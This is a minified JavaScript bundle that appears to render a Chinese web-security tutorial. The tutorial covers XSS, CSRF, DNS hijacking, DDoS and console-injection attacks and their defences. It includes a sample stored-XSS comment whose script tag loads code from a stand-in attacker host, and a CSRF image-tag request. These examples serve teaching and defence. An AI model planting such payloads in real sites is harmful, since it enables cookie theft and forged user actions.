(window.webpackJsonp=window.webpackJsonp||[]).push([[47],{446:function(_,v,t){"use strict";t.r(v);var s=t(44),e=Object(s.a)({},(function(){var _=this,v=_.$createElement,t=_._self._c||v;return t("ContentSlotsDistributor",{attrs:{"slot-key":_.$parent.slotKey}},[t("p",[_._v("XSS 和 CSRF 是 web 安全领域，最常见的攻击方式。")]),_._v(" "),t("h2",{attrs:{id:"_1-xss-cross-site-script-跨站脚本攻击"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_1-xss-cross-site-script-跨站脚本攻击"}},[_._v("#")]),_._v(" 1. XSS（Cross Site Script）跨站脚本攻击")]),_._v(" "),t("blockquote",[t("p",[t("code",[_._v("XSS")]),_._v("攻击是指攻击者在网页上注入攻击脚本，从而获取用户的隐私数据（如：cookie、session等）。本质是恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。")])]),_._v(" "),t("h3",{attrs:{id:"如何攻击"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#如何攻击"}},[_._v("#")]),_._v(" 如何攻击")]),_._v(" "),t("p",[t("code",[_._v("XSS")]),_._v("攻击主要分为三种：存储型、反射型、DOM型")]),_._v(" "),t("h4",{attrs:{id:"存储型"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#存储型"}},[_._v("#")]),_._v(" 存储型")]),_._v(" "),t("p",[_._v("攻击步骤：")]),_._v(" "),t("ol",[t("li",[_._v("攻击者将恶意代码提交到目标网站的数据库中；")]),_._v(" "),t("li",[_._v("用户打开目标网站时，服务端从数据库中取出恶意代码，拼接在"),t("code",[_._v("HTML")]),_._v("中返回给浏览器；")]),_._v(" "),t("li",[_._v("浏览器接收到含有恶意代码的"),t("code",[_._v("HTML")]),_._v("并执行；")]),_._v(" "),t("li",[_._v("恶意代码窃取用户数据并发送给攻击者，或者冒充用户调用目标网站的接口，对目标网站执行指定的攻击。")])]),_._v(" "),t("p",[_._v("这种攻击常见于带有用户保存数据的网站，这样攻击者才有机会将恶意代码提交到数据库，如论坛发帖、商品评论、用户私信等。")]),_._v(" "),t("p",[_._v("eg. 发表恶意评论，被存入数据库：")]),_._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",[t("code",[_._v('    质量非常不错！<script src="danger.com/spread.js"><\/script>\n')])])]),t("p",[_._v("当页面读取并展示该评论时，就会加载并执行恶意代码。")]),_._v(" "),t("h4",{attrs:{id:"反射型"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#反射型"}},[_._v("#")]),_._v(" 反射型")]),_._v(" "),t("p",[_._v("攻击步骤：")]),_._v(" "),t("ol",[t("li",[_._v("攻击者构造出带有恶意代码的"),t("code",[_._v("URL")]),_._v("；")]),_._v(" "),t("li",[_._v("用户打开带有恶意代码的"),t("code",[_._v("URL")]),_._v("时，服务端从"),t("code",[_._v("URL")]),_._v("中取出恶意代码，拼接在"),t("code",[_._v("HTML")]),_._v("中返回给浏览器；")]),_._v(" "),t("li",[_._v("浏览器接收到含有恶意代码的"),t("code",[_._v("HTML")]),_._v("并执行；")]),_._v(" "),t("li",[_._v("恶意代码窃取用户数据并发送给攻击者，或者冒充用户调用目标网站的接口，对目标网站执行指定的攻击。")])]),_._v(" "),t("p",[_._v("这种攻击常见于通过"),t("code",[_._v("URL")]),_._v("传递参数的功能，如网站搜索、跳转等。"),t("br"),_._v("\n与存储型的区别在于：存储型的恶意代码在数据库中，而反射型的恶意代码在"),t("code",[_._v("URL")]),_._v("中。")]),_._v(" "),t("h4",{attrs:{id:"dom型"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#dom型"}},[_._v("#")]),_._v(" DOM型")]),_._v(" "),t("p",[_._v("攻击步骤：")]),_._v(" "),t("ol",[t("li",[_._v("攻击者构造出带有恶意代码的"),t("code",[_._v("URL")]),_._v("；")]),_._v(" "),t("li",[_._v("用户打开带有恶意代码的"),t("code",[_._v("URL")]),_._v("时，浏览器从"),t("code",[_._v("URL")]),_._v("中取出恶意代码，并执行；")]),_._v(" "),t("li",[_._v("恶意代码窃取用户数据并发送给攻击者，或者冒充用户调用目标网站的接口，对目标网站执行指定的攻击。")])]),_._v(" "),t("p",[_._v("这种攻击也是常见于通过"),t("code",[_._v("URL")]),_._v("传递参数的功能，如网站搜索、跳转等。"),t("br"),_._v("\n与存储型、反射型的区别在于："),t("code",[_._v("DOM")]),_._v("型攻击是由浏览器取出恶意代码而非服务端取出，所以属于前端自身的安全漏洞，而另外两种属于服务端安全漏洞。")]),_._v(" "),t("h3",{attrs:{id:"如何防范"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#如何防范"}},[_._v("#")]),_._v(" 如何防范")]),_._v(" "),t("ol",[t("li",[_._v("前端输入校验\n针对存储型，表单提交前进行校验，例如将"),t("code",[_._v("<script>")]),_._v("中的'<''>'转译成对应的ASCII码、使用xss校验模块"),t("code",[_._v("js-xss")]),_._v("等。")]),_._v(" "),t("li",[_._v("服务端输入过滤\n由于攻击者可以通过直接构造请求，绕过前端过滤，所以，输入过滤通常放在服务端进行。")]),_._v(" "),t("li",[_._v("防止劫持cookie\n服务端在响应报文的 Set-Cookie 字段中，添加 HttpOnly ，可禁止 js 获取cookie，从而阻止恶意代码劫持cookie。")])]),_._v(" "),t("h2",{attrs:{id:"_2-csrf-cross-site-request-forgery-跨站请求伪造"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_2-csrf-cross-site-request-forgery-跨站请求伪造"}},[_._v("#")]),_._v(" 2. CSRF（Cross Site Request Forgery）跨站请求伪造")]),_._v(" "),t("blockquote",[t("p",[_._v("攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。")])]),_._v(" "),t("h3",{attrs:{id:"如何攻击-2"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#如何攻击-2"}},[_._v("#")]),_._v(" 如何攻击")]),_._v(" "),t("p",[_._v("攻击步骤：")]),_._v(" "),t("ol",[t("li",[_._v("用户登录"),t("code",[_._v("a.com")]),_._v("，并保留了登录凭证（"),t("code",[_._v("cookie")]),_._v("）；")]),_._v(" "),t("li",[_._v("攻击者引诱用户访问"),t("code",[_._v("b.com")]),_._v("；")]),_._v(" "),t("li",[t("code",[_._v("b.com")]),_._v("向"),t("code",[_._v("a.com")]),_._v("服务器发送一个请求："),t("code",[_._v("a.com/act=xx")]),_._v("，浏览器会默认携带"),t("code",[_._v("a.com")]),_._v("的"),t("code",[_._v("cookie")]),_._v("；")]),_._v(" "),t("li",[t("code",[_._v("a.com")]),_._v("服务端收到请求后，通过"),t("code",[_._v("cookie")]),_._v("验证，误以为用户身份有效；")]),_._v(" "),t("li",[_._v("攻击者冒用用户身份，成功的在目标网站执行了恶意代码。"),t("br"),_._v("\n（CSRF通常是为了对目标服务器进行数据更新(例如转账)等操作，假设a.com网站用get请求实现数据更新，那么攻击者只需发送类似"),t("code",[_._v('<img src="a.com/act=xx"/>')]),_._v("这样的get请求即可实现攻击，而a.com网站使用post请求实现数据更新，就会增加攻击难度(需要模拟表单提交)，这也说明了我们应该选用正确的请求方式实现相应http请求。另一方面，使用post请求实现数据更新，也为Cookie中设置SameSite字段防范CSRF攻击提供了可能）")])]),_._v(" "),t("h3",{attrs:{id:"如何防范-2"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#如何防范-2"}},[_._v("#")]),_._v(" 如何防范")]),_._v(" "),t("p",[_._v("通过上述步骤可以发现"),t("code",[_._v("CSRF")]),_._v("的特点：")]),_._v(" "),t("ol",[t("li",[_._v("攻击发生在第三方域名；")]),_._v(" "),t("li",[_._v("攻击者没有获取用户的"),t("code",[_._v("cookie")]),_._v("信息，而只是冒用。")])]),_._v(" "),t("p",[_._v("针对这两个特点，可以制定防范措施：")]),_._v(" "),t("ol",[t("li",[_._v("阻止不明域名的访问：")])]),_._v(" "),t("ul",[t("li",[_._v("同源检查(请求头中添加Origin字段 —— 注意 Origin 与 Referer，前者仅包含协议和域名，而后者是完整的 URI 存在安全隐患)；")]),_._v(" "),t("li",[_._v("利用Cookie中的SameSite字段限制第三方页面访问目标网站时携带Cookie，它有三个值：Strict-所有形式访问都不允许，Lax-仅部分Get形式请求允许（包括链接跳转、css加载请求、GET表单提交），None-关闭此限制。（因为通常数据更新操作都是post请求实现，所以仅允许get请求能拿到cookie，就可以避免伪造post请求实现攻击）")])]),_._v(" "),t("ol",{attrs:{start:"2"}},[t("li",[_._v("提交请求时附加本域名下才能获得的信息：token验证。(token存在localstorage中，由于同源限制，只有在本域名下才能获取)")])]),_._v(" "),t("h2",{attrs:{id:"_3-dns劫持"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_3-dns劫持"}},[_._v("#")]),_._v(" 3. DNS劫持")]),_._v(" "),t("blockquote",[t("p",[_._v("URL请求的第一步是DNS解析，获得ip地址后向对应服务器发起请求。而DNS劫持就是指在DNS解析过程中，使浏览器获取到错误的ip地址，从而诱导用户访问恶意网站，窃取用户信息。")])]),_._v(" "),t("p",[_._v("要了解DNS劫持发生在哪些环节，就要清楚DNS解析经历哪些步骤：")]),_._v(" "),t("ol",[t("li",[_._v("查找浏览器DNS缓存；")]),_._v(" "),t("li",[_._v("查找操作系统DNS缓存、host配置；")]),_._v(" "),t("li",[_._v("查找路由器DNS缓存；")]),_._v(" "),t("li",[_._v("查找运营商本地服务器DNS缓存；")]),_._v(" "),t("li",[_._v("查找根域名——>顶级域名——>次级域名——>主机名，得到完整IP。（www.baidu.com.root）")])]),_._v(" "),t("h3",{attrs:{id:"如何劫持"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#如何劫持"}},[_._v("#")]),_._v(" 如何劫持")]),_._v(" "),t("ol",[t("li",[_._v("本地DNS劫持：使用户电脑感染木马病毒或安装恶意软件后，恶意修改浏览器DNS缓存、操作系统DNS缓存、host配置等；")]),_._v(" "),t("li",[_._v("路由器DNS劫持：很多用户使用路由器的默认密码，攻击者可以侵入到路由管理员账号中，修改路由器的DNS缓存、默认DNS配置等；")]),_._v(" "),t("li",[_._v("攻击DNS服务器")])]),_._v(" "),t("h3",{attrs:{id:"如何防范-3"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#如何防范-3"}},[_._v("#")]),_._v(" 如何防范")]),_._v(" "),t("ol",[t("li",[_._v("开启防火墙、安装杀毒软件；")]),_._v(" "),t("li",[_._v("增加路由器密码复杂度；")]),_._v(" "),t("li",[_._v("用HTTP DNS 代替 Local DNS，即让DNS查询绕过查找浏览器、操作系统、路由器等本地缓存。")])]),_._v(" "),t("h2",{attrs:{id:"_4-ddos攻击"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_4-ddos攻击"}},[_._v("#")]),_._v(" 4. DDoS攻击")]),_._v(" "),t("blockquote",[t("p",[_._v("称是 Distributed Denial of Service，翻译成中文就是分布式拒绝服务。是指对目标网站在较短的时间内发起大量请求，大规模消耗目标网站的主机资源，让它无法正常服务。")])]),_._v(" "),t("h3",{attrs:{id:"如何防范-4"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#如何防范-4"}},[_._v("#")]),_._v(" 如何防范")]),_._v(" "),t("ol",[t("li",[_._v("CDN加速，利用CDN较少直接访问服务器的请求数量；")]),_._v(" "),t("li",[_._v("设置黑名单，拒绝特定用户的访问；")]),_._v(" "),t("li",[_._v("DDoS清洗，拒绝响应特定用户的请求（允许访问，但不响应）。")])]),_._v(" "),t("h2",{attrs:{id:"_5-其它常见网络安全"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_5-其它常见网络安全"}},[_._v("#")]),_._v(" 5. 其它常见网络安全")]),_._v(" "),t("h3",{attrs:{id:"网络劫持攻击"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#网络劫持攻击"}},[_._v("#")]),_._v(" 网络劫持攻击")]),_._v(" "),t("p",[_._v("攻击方式：攻击者利用代理服务器、路由器等中间件，截取http请求中的用户信息。"),t("br"),_._v("\n防范措施：Http请求加密。")]),_._v(" "),t("h3",{attrs:{id:"控制台注入代码"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#控制台注入代码"}},[_._v("#")]),_._v(" 控制台注入代码")]),_._v(" "),t("p",[_._v("攻击方式：诱导用户在控制台输入相关代码，从而获取用户cookie等信息。"),t("br"),_._v("\n防范措施：控制台友好提示用户不要在此操作。")])])}),[],!1,null,null,null);v.default=e.exports}}]);